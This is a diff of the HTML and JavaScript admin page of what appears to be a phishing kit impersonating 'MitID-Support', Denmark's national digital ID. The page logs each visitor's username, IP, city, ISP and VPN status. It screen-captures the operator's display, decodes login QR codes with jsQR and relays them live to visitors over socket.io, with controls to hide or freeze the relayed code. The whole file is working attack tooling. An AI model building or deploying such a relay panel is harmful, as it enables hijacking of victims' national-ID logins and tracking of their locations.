@@ -1,162 +1,234 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Admin Panel - Client Monitor</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Admin Panel - Support QR</title>
 
-  <!-- Bootstrap 5 -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-
-  <!-- Socket.io -->
   <script src="/socket.io/socket.io.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
   <style>
-    body {
-      background-color: #f7f8fa;
-      font-family: 'Inter', sans-serif;
-    }
-    .navbar {
-      background: #0d6efd;
-      color: white;
-    }
-    .navbar-brand {
-      font-weight: 600;
-    }
-    .container {
-      margin-top: 2rem;
-    }
-    .table thead {
-      background-color: #0d6efd;
-      color: white;
-    }
-    .table tbody tr.guest-row td {
-      color: #888 !important;
-    }
-    .vpn-true {
-      color: #dc3545;
-      font-weight: bold;
-    }
-    .vpn-false {
-      color: #198754;
-      font-weight: bold;
-    }
-    .flag {
-      font-size: 1.2rem;
-      margin-right: 4px;
-    }
-    .status-pill {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      margin-right: 6px;
-    }
-    .status-online { background-color: #28a745; }
-    .status-guest { background-color: #adb5bd; }
-    .footer {
-      text-align: center;
-      padding: 10px;
-      color: #666;
-      font-size: 0.9rem;
-      margin-top: 2rem;
-    }
+    body { background:#f8f9fa; }
+    .container { max-width:1100px; }
+    #qrCanvas { display:inline-block; margin-top:8px; }
+    #debugLog { background:#eee; padding:10px; height:200px; overflow:auto; }
+    td.gray { color: gray; }
   </style>
 </head>
 <body>
-
-  <!-- Navbar -->
-  <nav class="navbar navbar-expand-lg navbar-dark">
-    <div class="container-fluid">
-      <span class="navbar-brand">Admin Dashboard</span>
-      <span class="ms-auto">Connected Clients: <span id="clientCount" class="fw-bold">0</span></span>
+  <div class="container my-4">
+    <div class="d-flex align-items-center mb-4">
+      <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;height:auto;margin-right:12px;">
+      <h3 class="m-0">MitID-Support — Admin Panel</h3>
     </div>
-  </nav>
+    
+    <div class="alert alert-info">
+      Instruct users to navigate to: <strong><span id="siteUrl"></span></strong>
+    </div>
 
-  <!-- Content -->
-  <div class="container">
-    <div class="card shadow-sm">
-      <div class="card-header bg-white">
-        <h5 class="card-title mt-2 mb-0">Active Connections</h5>
-        <p class="text-muted small mb-0">Live view of all connected users and guests</p>
-      </div>
-      <div class="table-responsive">
-        <table class="table table-hover align-middle mb-0">
-          <thead>
-            <tr>
-              <th>Status</th>
-              <th>Username</th>
-              <th>IP</th>
-              <th>City</th>
-              <th>Region</th>
-              <th>Country</th>
-              <th>ISP</th>
-              <th>VPN</th>
-              <th>Ping (ms)</th>
-            </tr>
-          </thead>
-          <tbody id="clientListBody">
-            <tr><td colspan="9" class="text-center text-muted">Waiting for connections...</td></tr>
-          </tbody>
-        </table>
+    <div class="mb-3">
+      <button id="start" class="btn btn-success">Start Stream</button>
+      <button id="stop" class="btn btn-danger">Stop Stream</button>
+      <button id="hide" class="btn btn-warning">Hide QR</button>
+      <button id="show" class="btn btn-info">Show QR</button>
+      <button id="freeze" class="btn btn-secondary">Freeze Scan</button>
+      <button id="unfreeze" class="btn btn-light">Unfreeze Scan</button>
+    </div>
+
+    <div class="mb-3">
+      <p>Status: <span id="status">Idle</span></p>
+      <p>Hidden: <span id="hiddenStatus">No</span></p>
+      <p>Frozen: <span id="frozenStatus">No</span></p>
+      <p>Admin ping: <span id="adminPing">0</span> ms</p>
+      <p>Scan interval: <span id="scanIntervalDisplay">500</span> ms</p>
+      <div class="input-group mb-2" style="max-width:320px">
+        <input id="scanIntervalInput" class="form-control" placeholder="Scan interval (ms)" type="number" min="100" max="5000"/>
+        <button id="setScanInterval" class="btn btn-outline-primary">Set</button>
       </div>
     </div>
+
+    <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
+    <div id="clientListContainer" class="mb-3" style="max-height: 240px; overflow-y: auto;">
+      <table class="table table-striped table-sm">
+        <thead>
+          <tr>
+            <th>Username</th>
+            <th>IP</th>
+            <th>City</th>
+            <th>Region</th>
+            <th>Country</th>
+            <th>ISP</th>
+            <th>VPN</th>
+            <th>Ping (ms)</th>
+            <th>Socket ID</th>
+          </tr>
+        </thead>
+        <tbody id="clientListBody"></tbody>
+      </table>
+    </div>
+    <button id="refreshList" class="btn btn-outline-secondary mb-3">Refresh Client List</button>
+
+    <h5>QR Preview</h5>
+    <div id="qrCanvas"></div>
+
+    <h5 class="mt-3">Screen Capture Preview</h5>
+    <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
+    <canvas id="canvas" width="1280" height="720" style="display:none"></canvas>
+
+    <h5 class="mt-3">Debug Log</h5>
+    <div id="debugLog"></div>
   </div>
 
-  <div class="footer">
-    Admin Dashboard © <span id="year"></span> | Real-Time Client Monitor
-  </div>
+<script>
+(() => {
+  const socket = io();
+  socket.emit('join', 'admin');
 
-  <script>
-    const socket = io();
-    const body = document.getElementById('clientListBody');
-    const clientCount = document.getElementById('clientCount');
-    document.getElementById('year').textContent = new Date().getFullYear();
+  document.getElementById('siteUrl').textContent = window.location.origin;
+  const statusEl = document.getElementById('status');
+  const hiddenStatusEl = document.getElementById('hiddenStatus');
+  const frozenStatusEl = document.getElementById('frozenStatus');
+  const adminPingEl = document.getElementById('adminPing');
+  const clientListBody = document.getElementById('clientListBody');
+  const clientCountEl = document.getElementById('clientCount');
+  const qrCanvasDiv = document.getElementById('qrCanvas');
+  const debugLog = document.getElementById('debugLog');
+  const scanIntervalDisplay = document.getElementById('scanIntervalDisplay');
 
-    socket.emit('join', 'admin');
+  let stream = null;
+  let detectionInterval = null;
+  let lastQrValue = null;
+  let scanIntervalMs = localStorage.getItem('scanIntervalMs') ? parseInt(localStorage.getItem('scanIntervalMs')) : 500;
+  let isFrozen = localStorage.getItem('isFrozen') === 'true';
+  let isHidden = localStorage.getItem('isHidden') === 'true';
 
-    socket.on('client_list', (list) => {
-      body.innerHTML = '';
-      clientCount.textContent = list.length;
+  function log(msg) {
+    const p = document.createElement('p');
+    p.textContent = `${new Date().toLocaleTimeString()} - ${msg}`;
+    debugLog.appendChild(p);
+    if (debugLog.children.length > 300) debugLog.removeChild(debugLog.firstChild);
+    debugLog.scrollTop = debugLog.scrollHeight;
+  }
 
-      if (list.length === 0) {
-        body.innerHTML = '<tr><td colspan="9" class="text-center text-muted">No clients connected</td></tr>';
-        return;
-      }
+  document.getElementById('start').addEventListener('click', startStream);
+  document.getElementById('stop').addEventListener('click', stopStream);
+  document.getElementById('hide').addEventListener('click', () => toggleHide(true));
+  document.getElementById('show').addEventListener('click', () => toggleHide(false));
+  document.getElementById('freeze').addEventListener('click', freezeScan);
+  document.getElementById('unfreeze').addEventListener('click', unfreezeScan);
+  document.getElementById('setScanInterval').addEventListener('click', () => {
+    const v = parseInt(document.getElementById('scanIntervalInput').value);
+    if (!v || v < 100 || v > 5000) return alert('Enter 100-5000 ms');
+    scanIntervalMs = v;
+    localStorage.setItem('scanIntervalMs', String(v));
+    scanIntervalDisplay.textContent = v;
+    if (detectionInterval) {
+      clearInterval(detectionInterval);
+      detectionInterval = setInterval(detectQr, scanIntervalMs);
+    }
+    log('Scan interval set to ' + v + ' ms');
+    document.getElementById('scanIntervalInput').value = '';
+  });
 
-      list.forEach(c => {
-        const isGuest = c.username.includes('Not logged in yet');
-        const row = document.createElement('tr');
-        if (isGuest) row.classList.add('guest-row');
+  document.getElementById('refreshList').addEventListener('click', () => socket.emit('request_client_list'));
 
-        row.innerHTML = `
-          <td>
-            <span class="status-pill ${isGuest ? 'status-guest' : 'status-online'}"></span>
-            ${isGuest ? 'Guest' : 'Online'}
-          </td>
-          <td>${c.username}</td>
-          <td>${c.ip || ''}</td>
-          <td>${c.city || ''}</td>
-          <td>${c.region || ''}</td>
-          <td>${c.countryFlag ? '<span class="flag">' + c.countryFlag + '</span>' : ''}${c.country || ''}</td>
-          <td>${c.isp || ''}</td>
-          <td class="${c.vpn ? 'vpn-true' : 'vpn-false'}">${c.vpn ? 'Yes' : 'No'}</td>
-          <td>${c.ping || ''}</td>
-        `;
+  socket.on('client_list', (list) => {
+    clientListBody.innerHTML = '';
+    clientCountEl.textContent = list.length;
+    list.forEach(c => {
+      const tr = document.createElement('tr');
+      const isGuest = c.username.includes('Not logged in yet');
+      tr.className = isGuest ? 'gray' : '';
+      tr.innerHTML = `
+        <td>${c.username}</td>
+        <td>${c.ip || ''}</td>
+        <td>${c.city || ''}</td>
+        <td>${c.region || ''}</td>
+        <td>${(c.countryFlag ? c.countryFlag + ' ' : '') + (c.country || '')}</td>
+        <td>${c.isp || ''}</td>
+        <td>${c.vpn ? '✅' : '❌'}</td>
+        <td>${c.ping}</td>
+        <td>${c.id}</td>
+      `;
+      clientListBody.appendChild(tr);
+    });
+  });
 
-        body.appendChild(row);
+  socket.on('ping', (startTime) => socket.emit('pong', startTime));
+  socket.on('your_ping', (p) => adminPingEl.textContent = p);
+  socket.on('error', (m) => alert(m));
+
+  // The rest of your QR scanning & stream logic remains unchanged below...
+  async function startStream() {
+    try {
+      stream = await navigator.mediaDevices.getDisplayMedia({
+        video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } }
       });
-    });
+      const videoEl = document.getElementById('video');
+      videoEl.muted = true;
+      videoEl.srcObject = stream;
+      const p = videoEl.play();
+      if (p && p.catch) p.catch(e => log('Video play promise rejected: ' + e));
+      socket.emit('start_stream');
+      statusEl.textContent = 'Streaming';
+      if (!isFrozen) detectionInterval = setInterval(detectQr, scanIntervalMs);
+      log('Stream started');
+    } catch (err) {
+      log('Screen share failed: ' + (err.message || err));
+      alert('Screen share failed: ' + (err.message || err));
+    }
+  }
 
-    socket.on('connect_error', () => {
-      body.innerHTML = '<tr><td colspan="9" class="text-center text-danger">Connection error. Retrying...</td></tr>';
-    });
+  function stopStream() {
+    if (stream) {
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+    }
+    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
+    socket.emit('stop_stream');
+    statusEl.textContent = 'Idle';
+    log('Stream stopped');
+  }
 
-    socket.on('disconnect', () => {
-      body.innerHTML = '<tr><td colspan="9" class="text-center text-danger">Disconnected from server</td></tr>';
-    });
-  </script>
+  function detectQr() {
+    const video = document.getElementById('video');
+    if (!video || !video.videoWidth) return;
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
+    const code = jsQR(imageData.data, imageData.width, imageData.height);
+    if (code && code.data && code.data !== lastQrValue) {
+      lastQrValue = code.data;
+      qrCanvasDiv.innerHTML = '';
+      new QRCode(qrCanvasDiv, { text: code.data, width: 128, height:128 });
+      socket.emit('qr_update', code.data);
+      log('Detected new QR: ' + code.data);
+    }
+  }
 
+  function toggleHide(h) {
+    isHidden = !!h;
+    localStorage.setItem('isHidden', String(isHidden));
+    socket.emit('toggle_hide', isHidden);
+    hiddenStatusEl.textContent = isHidden ? 'Yes' : 'No';
+  }
+
+  function freezeScan() {
+    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
+    isFrozen = true; localStorage.setItem('isFrozen','true');
+    frozenStatusEl.textContent = 'Yes';
+  }
+  function unfreezeScan() {
+    isFrozen = false; localStorage.setItem('isFrozen','false');
+    frozenStatusEl.textContent = 'No';
+    if (stream && !detectionInterval) detectionInterval = setInterval(detectQr, scanIntervalMs);
+  }
+})();
+</script>
 </body>
 </html>
